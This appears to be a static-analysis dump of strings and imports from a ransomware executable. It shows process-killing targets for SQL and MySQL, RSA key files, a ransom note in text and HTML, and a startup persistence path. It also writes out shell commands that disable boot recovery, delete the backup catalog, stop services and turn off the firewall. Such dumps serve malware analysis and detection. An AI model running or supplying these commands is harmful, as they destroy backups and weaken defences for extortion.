reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40f70f	0x4f7124	import	0x40f680	KERNEL32.dll.FindFirstFileW
0x40f720	0x518ab8	string	0x40f680	fuck
0x40fa8b	0x40faa1	string	0x40f680	RQ莝\t blocks=Basic Latin,CJK Unified Ideographs
0x40fbd7	0x518a08	string	0x40f680	C:\Windows
0x40fbea	0x518a20	string	0x40f680	C:\\Windows\
0x40fe06	0x4f7150	import	0x40f680	KERNEL32.dll.lstrcmpW
0x40fe31	0x518a08	string	0x40f680	C:\Windows
0x40fe78	0x4f712c	import	0x40f680	KERNEL32.dll.FindNextFileW
0x40fe8c	0x4f7138	import	0x40f680	KERNEL32.dll.FindClose
0x40ff92	0x40ffa8	string	0x40f680	QV臘\t blocks=Basic Latin,CJK Unified Ideographs
0x4101cd	0x4f7120	import	0x410180	KERNEL32.dll.GetLogicalDrives
0x410310	0x518b64	string	0x4102e0	sqlserver.exe
0x41034a	0x518b74	string	0x4102e0	msftesql.exe
0x41037b	0x518b8c	string	0x4102e0	sqlagent.exe
0x4103ac	0x518b9c	string	0x4102e0	sqlbrowser.exe
0x4103dd	0x518bac	string	0x4102e0	sqlwriter.exe
0x410405	0x518bbc	string	0x4102e0	mysqld.exe
0x41042a	0x518bc8	string	0x4102e0	mysqld-nt.exe
0x41044f	0x518bd8	string	0x4102e0	mysqld-opt.exe
0x41048c	0x4f7148	import	0x4102e0	KERNEL32.dll.CloseHandle
0x4104a4	0x4f7140	import	0x4102e0	KERNEL32.dll.CreateToolhelp32Snapshot
0x4104be	0x4f7128	import	0x4102e0	KERNEL32.dll.Process32First
0x41050a	0x4f713c	import	0x4102e0	KERNEL32.dll.OpenProcess
0x410519	0x4f7130	import	0x4102e0	KERNEL32.dll.TerminateProcess
0x410520	0x4f7148	import	0x4102e0	KERNEL32.dll.CloseHandle
0x41052a	0x4f7148	import	0x4102e0	KERNEL32.dll.CloseHandle
0x410538	0x4f7144	import	0x4102e0	KERNEL32.dll.Process32Next
0x410616	0x4f7124	import	0x410590	KERNEL32.dll.FindFirstFileW
0x41084a	0x4f7150	import	0x410590	KERNEL32.dll.lstrcmpW
0x41087c	0x518bec	string	0x410590	\Decryption-Guide.txt
0x410a57	0x4f712c	import	0x410590	KERNEL32.dll.FindNextFileW
0x410a71	0x4f7138	import	0x410590	KERNEL32.dll.FindClose
0x410b74	0x410b8a	string	0x410590	QV襌\t blocks=Basic Latin,CJK Unified Ideographs
0x410c90	0x410ca6	string	0x410590	RQ艋\t blocks=Basic Latin,CJK Unified Ideographs
0x410dd6	0x4f7124	import	0x410d50	KERNEL32.dll.FindFirstFileW
0x410f74	0x410f8a	string	0x410d50	RQ襈\t blocks=Basic Latin,CJK Unified Ideographs
0x41100a	0x4f7150	import	0x410d50	KERNEL32.dll.lstrcmpW
0x411217	0x4f712c	import	0x410d50	KERNEL32.dll.FindNextFileW
0x411231	0x4f7138	import	0x410d50	KERNEL32.dll.FindClose
0x4115aa	0x518c70	string	0x411570	0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNM
0x411769	0x518ccc	string	0x4116a0	C:\ProgramData\IDk.txt
0x4117ad	0x518ce4	string	0x4116a0	C:\ProgramData\pkey.txt
0x411986	0x518ce4	string	0x4116a0	C:\ProgramData\pkey.txt
0x411af3	0x518ccc	string	0x4116a0	C:\ProgramData\IDk.txt
0x411bf9	0x518cfc	string	0x4116a0	C:\ProgramData
0x411c8d	0x518cfc	string	0x4116a0	C:\ProgramData
0x411d1f	0x518c48	string	0x4116a0	0123456789
0x411e54	0x518c54	string	0x4116a0	QWERTYUIOPASDFGHJKLZXCVBNM
0x4121d9	0x518ccc	string	0x4116a0	C:\ProgramData\IDk.txt
0x412606	0x518ce4	string	0x4116a0	C:\ProgramData\pkey.txt
0x412635	0x5188a4	string	0x4116a0	OutputFileName
0x412657	0x5188c8	string	0x4116a0	OutputBinaryMode
0x4126ff	0x518d10	string	0x4116a0	95DE4925807931C8D34E1D9460A2DE
0x412726	0x518d30	string	0x4116a0	B56BFF3C6B2E0F4E9F1DAE9E473CB39B6EE513DDC656B7B925468DE9FBCC1AB57E148DDE1009F8B7529A4E84850D7ECF43637A2D898EAEA3579544028F90370C65820B44A2C0B842A5D993F34FA8C549E9B20932D8BE55992CE50C95510FDD95734C8FFF874E771D33225664466F6E226FAF33FE35714A61E147AF2F17CF81015EEFBE8274C2672480956E3D44D54675E7725C53E334CBD146FA0B9B1F239898BDC3E5566E0DCB0E5FAEE35B685C0EEA7885CAE76DAA4A467E168C2AD1B1D32D883203A8F3A5FEA70903CC6F49067F099D2CAEED344F339E3BF1512BFC566CD2B3D68FC69A12BBFC565067CD777B65F7D9DA0A246CF4DA8C9362B55E9184658243C060381312A10A356D2039CA76CBC6BD1679E983ED653567CB8DBD7DC2FAF4F4F539EE41C6DB9B53C04F0F90CDA65FB3378739A75E016753EBA8FB838E8EE2AFC92FDB1CC3C4C94B88CFADC42BC1D781787661EEADA813C4A8802AD3211E04A39DEFA683CEEC8CFA9195936BCF66B3D42729A1E7E61AB4C521E2232365217743381CFD4B58FEE404639320574FA8C46580291B5412259D2CEEADF947D4DA5AD5EE3D149B2F80D969525DD8E8E1FA3983C9930577534CF1A00A264A482C709A1278BD1EB24AB328
0x412935	0x5190c4	string	0x4116a0	https://api.my-ip.io/ip
0x4129fc	0x519194	string	0x4116a0	%d-%m-%Y %H:%M:%S
0x412a69	0x5191a8	string	0x4116a0	C:\ProgramData\prvkey.txt
0x412b5c	0x5191e8	string	0x4116a0	\n\nID=
0x412b7e	0x5191dc	string	0x4116a0	Disksize=
0x412c7f	0x5191d4	string	0x4116a0	Mail=
0x412d3e	0x5191cc	string	0x4116a0	Ip=
0x412dfa	0x5191c4	string	0x4116a0	Date:
0x413358	0x5191a8	string	0x4116a0	C:\ProgramData\prvkey.txt
0x41339b	0x5191f0	string	0x4116a0	C:\ProgramData\RSAKEY.key
0x41380a	0x518a50	string	0x4116a0	
0x413b4f	0x519234	string	0x4116a0	RSAKEY-
0x413b90	0x4f7134	import	0x4116a0	KERNEL32.dll.GetDriveTypeA
0x413c44	0x519248	string	0x4116a0	.key
0x413d1b	0x5191f0	string	0x4116a0	C:\ProgramData\RSAKEY.key
0x413d72	0x519258	string	0x4116a0	fuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyou
0x4145a3	0x4f714c	import	0x414470	KERNEL32.dll.FreeConsole
0x414643	0x518d10	string	0x414470	95DE4925807931C8D34E1D9460A2DE
0x414664	0x519358	string	0x414470	FF91D4F49BEC3902D0CD7E4529EC2967F3FC677252030C98064DD6250A451A3C8D54311D529F9EC86329601CC9DE608299FBD1A306DB092ADD69EB3495C3BD6D12AB598F5896A8389D87A38BD6CACA48408E85098C40D92E
0x41467d	0x519358	string	0x414470	FF91D4F49BEC3902D0CD7E4529EC2967F3FC677252030C98064DD6250A451A3C8D54311D529F9EC86329601CC9DE608299FBD1A306DB092ADD69EB3495C3BD6D12AB598F5896A8389D87A38BD6CACA48408E85098C40D92E
0x41499f	0x51940c	string	0x414470	.lok
0x414a3d	0x519414	string	0x414470	net stop MSDTC
0x414a47	0x519424	string	0x414470	bcdedit /set {default} bootstatuspolicy ignoreallfailures
0x414a51	0x519460	string	0x414470	bcdedit /set {default} recoveryenabled no
0x414a5b	0x51948c	string	0x414470	wbadmin delete catalog -quiet
0x414a65	0x5194ac	string	0x414470	net stop SQLSERVERAGENT
0x414a6f	0x5194c4	string	0x414470	net stop MSSQLSERVER
0x414a79	0x5194dc	string	0x414470	net stop vds
0x414a83	0x5194ec	string	0x414470	netsh advfirewall set currentprofile state off
0x414a8d	0x51951c	string	0x414470	netsh firewall set opmode mode=disable
0x414a97	0x519544	string	0x414470	net stop SQLWriter
0x414aa1	0x519558	string	0x414470	net stop SQLBrowser
0x414aab	0x5194c4	string	0x414470	net stop MSSQLSERVER
0x414ab5	0x51956c	string	0x414470	net stop MSSQL$CONTOSO1
0x414b25	0x4f7134	import	0x414470	KERNEL32.dll.GetDriveTypeA
0x414cd0	0x4a9b30	string	0x414470	WVS3
0x414cde	0x4a9b30	string	0x414470	WVS3
0x414ea7	0x5195a8	string	0x414470	Your Files Are Has Been Locked\n\nYour Files Has Been Encrypted with cryptography Algorithm\n\nIf You Need Your Files And They are Important to You, Dont be shy Send Me an Email\n\nSend Test File + The Key File on Your System (File Exist in C:/ProgramData example : RSAKEY-SE-24r6t523 pr RSAKEY.KEY) to Make Sure Your Files Can be Restored\n\nMake an Agreement on Price with me and Pay\n\n\n\nGet Decryption Tool + RSA Key AND Instruction For Decryption Process\n\n\n\nAttention:\n\n1- Do Not Rename or Modify The Files (You May loose That file)\n\n2- Do Not Try To Use 3rd Party Apps or Recovery Tools ( if You want to do that make an copy from Files and try on them and Waste Your time )\n\n3-Do not Reinstall Operation System(Windows) You may loose the key File and Loose Your Files\n\n4-Do Not Always Trust to Middle mans and negotiators (some of them are good but some of them agree on 4000usd for example and Asked 10000usd From Client) this Was happened\n\n\n\nYour Case ID :
0x414ebc	0x519584	string	0x414470	\n\nOUR Email :
0x415023	0x519db8	string	0x414470	<!DOCTYPE html>\n<html lang='en'>\n<head>\n <meta http-equiv='X-UA-Compatible' content='IE=9' /> <script type='text/javascript'> window.resizeTo(window.screen.width,window.screen.height);</script> <meta charset='UTF - 8'>\n <title>Your Files Are Locked</title>\n <meta http-equiv='x - ua - compatible' content='IE = 9'/>\n <style>\n body { \n background-image: url('https://thumbor.forbes.com/thumbor/711x399/https://specials-images.forbesimg.com/imageserve/60b123d8f2894ada36d1fb5b/Lock---abstract-glitch-background/960x0.jpg');\n background-size: cover; \n font-size: 15pt;\n font-weight:bolder ;\n text-align: center;\n margin: auto;\n \n\n } #div1 {\n margin: auto;\n margin-top:50px;\n text-align: center;\n background-color: rgb(41, 46, 56);\n opacity: 95%;\n border-radius: 50px 20px;\n width: 60%;\n color: white;\n color: wheat;\n \n\n } #div2 {\n margin: auto;\n margin-top: 40px;\n text-align: center;\n background-color: rgb(41, 46, 56);\n opacity: 95%;\n border-radius: 50px 20px;\n width: 60%;\ncolor: wheat;\n } \n\n #div3{ \n color: white;\n margin: auto;\n margin-top:40px;\n text-align: center;\n background-color: rgb(41, 46, 56);\n opacity: 95%;\n border-radius: 50px 20px;\n width: 60%;\n } \n\n </style>\n</head>\n<body>\n<div id='div0'>\n<div id='div1'>\n Your Files Are Has Been Locked\n <br>\n Your Files Has Been Encrypted with cryptography Algorithm\n <br>\n If You Need Your Files And They are Important to You, Dont be shy Send Me an Email\n <br>\n Send Test File + The Key File on Your System (File Exist in C:/ProgramData example : KEY-SE-24r6t523 or RSAKEY.KEY) to Make Sure Your Fi
0x415032	0x519d70	string	0x414470	\n <br>\n Our Email:
0x4150ea	0x519d20	string	0x414470	\n </div> \n </div>\n</body>\n</html>
0x4152d4	0x4f7134	import	0x414470	KERNEL32.dll.GetDriveTypeA
0x4156d5	0x518bec	string	0x414470	\Decryption-Guide.txt
0x415a0a	0x518a88	string	0x414470	Unhandled exception caught
0x415a59	0x4f7134	import	0x414470	KERNEL32.dll.GetDriveTypeA
0x415d3c	0x518a88	string	0x414470	Unhandled exception caught
0x416009	0x5189dc	string	0x414470	space
0x416080	0x5192fc	string	0x414470	Unhandled exception\n
0x416657	0x416662	string	0x4165e0	3ɉN`Ɔ blocks=Basic Latin,Latin Extended-B
0x416f68	0x416f79	string	0x416f20	3ɉO` blocks=Basic Latin,Latin Extended-B
0x416f6e	0x416f79	string	0x416f20	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41702b	0x518858	string	0x417020	SHA-1
0x4171b7	0x51b360	string	0x417180	OutputStringPointer
0x417e87	0x417e99	string	0x417dd0	3ۋE\b blocks=Basic Latin,Arabic
0x418543	0x418547	string	0x418520	WPRQ
0x418d98	0x4ca7f4	string	0x418cf0	j\fhx
0x419072	0x4190a7	string	0x418f90	;O\fs
0x41a804	0x41a80f	string	0x41a7b0	3ɉN` blocks=Basic Latin,Latin Extended-B
0x41b3ea	0x41b3fb	string	0x41b3c0	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41b3f0	0x41b3fb	string	0x41b3c0	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41c0f3	0x51b404	string	0x41c0c0	BufferedTransformation: this object doesn't allow input
0x41c253	0x51b404	string	0x41c220	BufferedTransformation: this object doesn't allow input
0x41d860	0x51b43c	string	0x41d860	vector<T> too long
0x41e47d	0x518994	string	0x41e430	MGF1
0x41e502	0x518858	string	0x41e430	SHA-1
0x41e597	0x41e5ad	string	0x41e430	RQ育\b blocks=Basic Latin,CJK Unified Ideographs
0x41e720	0x51b4a8	string	0x41e720	invalid string position
0x41eea8	0x519250	string	0x41ee40	RSAKEY-
0x41f54b	0x518860	string	0x41f510	FeedbackSize
0x420021	0x518b50	string	0x41feb0	shit
0x420c79	0x420c8d	string	0x420b50	QP袋\b blocks=Basic Latin,CJK Unified Ideographs
0x42128e	0x4212a2	string	0x421190	QW荅\b blocks=Basic Latin,CJK Unified Ideographs
0x42156a	0x42157e	string	0x421470	QV豂\b blocks=Basic Latin,CJK Unified Ideographs
0x4223f0	0x51b4c0	string	0x4223f0	string too long
0x422b27	0x51854c	string	0x422a20	false
0x422b40	0x518554	string	0x422a20	true
0x42383c	0x519314	string	0x423830	C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\
0x424681	0x424650	string	0x424610	;}\ftAf
0x424694	0x424650	string	0x424610	;}\ftAf
0x424bf3	0x4f74c0	string	0x424bd0	easy handle already used in multi handle
0x426697	0x4f74f0	string	0x424ea0	SESS
0x4266d7	0x4f74f8	string	0x424ea0	FLUSH
0x426701	0x4f7500	string	0x424ea0	RELOAD
0x42676f	0x4f7508	string	0x424ea0	Set-Cookie:
0x426e54	0x426e69	string	0x424ea0	9Xht#
0x426e6c	0x426e91	string	0x424ea0	9Xlt
0x428411	0x4a9b30	string	0x4283d0	WVS3
0x428589	0x4f76f0	string	0x4283d0	Internal error removing splay node = %d\n
0x428623	0x4f771c	string	0x4285e0	Internal error clearing splay node = %d\n
0x4286ec	0x428721	string	0x4286b0	][^_Y
0x428820	0x4f73b8	import	0x428730	WS2_32.dll.closesocket
0x428c7f	0x4f7348	import	0x4288d0	WS2_32.dll.recv
0x428d26	0x428a47	string	0x4288d0	]_^[
0x4292ad	0x4f73b8	import	0x4291e0	WS2_32.dll.closesocket
0x42b0ca	0x42b139	string	0x42b060	3\t\a3
0x42b0d4	0x42b139	string	0x42b060	3\t\a3
0x42b101	0x42b139	string	0x42b060	3\t\a3
0x42b26a	0x42b260	string	0x42b170	;(t\rA
0x42b5df	0x42bc99	string	0x42b540	j\nhLxO
0x42b65a	0x4f7778	string	0x42b540	%4095[^;\r\n=] =%4095[^;\r\n]
0x42b77a	0x4f77c8	string	0x42b540	__Secure-
0x42b798	0x4f77d4	string	0x42b540	__Host-
0x42b7f1	0x4f77dc	string	0x42b540	secure
0x42b827	0x4f77e4	string	0x42b540	httponly
0x42b851	0x4f77f0	string	0x42b540	path
0x42b89e	0x4f77f8	string	0x42b540	domain
0x42b8c8	0x4f776c	string	0x42b540	localhost
0x42b9a9	0x4f7804	string	0x42b540	skipped cookie with bad tailmatch domain: %s\n
0x42b9fb	0x4f7834	string	0x42b540	version
0x42ba26	0x4f783c	string	0x42b540	max-age
0x42ba51	0x4f7844	string	0x42b540	expires
0x42baf7	0x4479e0	string	0x42b540	QSUVW
0x42bb1e	0x4f7794	string	0x42b540	oversized cookie dropped, name/val %zu + %zu bytes\n
0x42c4e6	0x42c7e1	string	0x42c4c0	_^]3
0x42c4f2	0x42c7e1	string	0x42c4c0	_^]3
0x42c8a0	0x42c8f1	string	0x42c870	_^]3
0x42c8a4	0x4f78b8	string	0x42c870	none
0x42c8e2	0x42c8f1	string	0x42c870	_^]3
0x42c8e6	0x42c8f1	string	0x42c870	_^]3
0x42c9b3	0x4f7508	string	0x42c870	Set-Cookie:
0x42ca15	0x42c9b0	string	0x42c870	j\vVh\buO
0x42cacd	0x4f78b8	string	0x42ca60	none
0x42cb24	0x4f7748	string	0x42ca60	ignoring failed cookie_init for %s\n
0x42cb45	0x42cba1	string	0x42ca60	3ۋ|$ blocks=Basic Latin,Arabic
0x42cb8d	0x42cba1	string	0x42ca60	3ۋ|$ blocks=Basic Latin,Arabic
0x42cbeb	0x4f7508	string	0x42ca60	Set-Cookie:
0x42cd0e	0x4f79a0	string	0x42ccc0	WARNING: failed to save cookies in %s\n
0x42ce73	0x4f78e4	string	0x42cda0	%s.%s.tmp
0x42cebd	0x4f78f8	string	0x42cda0	# Netscape HTTP Cookie File\n# https://curl.haxx.se/docs/http-cookies.html\n# This file was generated by libcurl! Edit at your own risk.\n\n
0x42cfac	0x4f7984	string	0x42cda0	#\n# Fatal libcurl error\n
0x42d26f	0x518658	string	0x42d260	unknown
0x42d2b4	0x4f7864	string	0x42d260	FALSE
0x42d2bd	0x4f785c	string	0x42d260	TRUE
0x42d2d7	0x4f784c	string	0x42d260	#HttpOnly_
0x42d2ec	0x4f78c8	string	0x42d260	%s%s%s\t%s\t%s\t%s\t%I64d\t%s\t%s
0x42d622	0x4f715c	import	0x42d500	KERNEL32.dll.InitializeCriticalSectionEx
0x42d66e	0x4f79f8	string	0x42d500	getaddrinfo() thread failed to start\n
0x42d854	0x4f7154	import	0x42d820	KERNEL32.dll.EnterCriticalSection
0x42d860	0x4f7158	import	0x42d820	KERNEL32.dll.LeaveCriticalSection
0x42da7c	0x4f7154	import	0x42da60	KERNEL32.dll.EnterCriticalSection
0x42da8f	0x4f7158	import	0x42da60	KERNEL32.dll.LeaveCriticalSection
0x42dadc	0x4f73b8	import	0x42da60	WS2_32.dll.closesocket
0x42db0c	0x4f7160	import	0x42db00	KERNEL32.dll.DeleteCriticalSection
0x42db42	0x4f73b8	import	0x42db00	WS2_32.dll.closesocket
0x42dc48	0x4f79cc	string	0x42dc40	proxy
0x42dc4d	0x4f79d4	string	0x42dc40	host
0x42dc69	0x4f79dc	string	0x42dc40	Could not resolve %s: %s
0x42e44a	0x42e495	string	0x42e440	_^]3
0x42e536	0x4f7d0c	string	0x42e4f0	Content-Type
0x42e572	0x4f7d74	string	0x42e4f0	multipart/mixed
0x42e59e	0x4f7d84	string	0x42e4f0	application/octet-stream
0x42e5cc	0x4f7cb0	string	0x42e4f0	text/plain
0x42e5eb	0x4f7da0	string	0x42e4f0	Content-Disposition
0x42e628	0x4f7db4	string	0x42e4f0	multipart/
0x42e63e	0x4f7dc0	string	0x42e4f0	attachment
0x42e647	0x4f7dc0	string	0x42e4f0	attachment
0x42e657	0x42e667	string	0x42e4f0	9|$$
0x42e65c	0x42e667	string	0x42e4f0	9|$$
0x42e6da	0x4f7dd0	string	0x42e4f0	; filename="
0x42e6ef	0x4f7de0	string	0x42e4f0	; name="
0x42e6ff	0x4f7dec	string	0x42e4f0	Content-Disposition: %s%s%s%s%s%s%s
0x42e742	0x4f7d50	string	0x42e4f0	; boundary=
0x42e74c	0x4f7d5c	string	0x42e4f0	Content-Type: %s%s%s
0x42e76b	0x4f7e10	string	0x42e4f0	Content-Transfer-Encoding
0x42e78c	0x42e7a4	string	0x42e4f0	Ph,~O
0x42e79f	0x4f7c20	string	0x42e4f0	8bit
0x42e7a5	0x4f7e2c	string	0x42e4f0	Content-Transfer-Encoding: %s
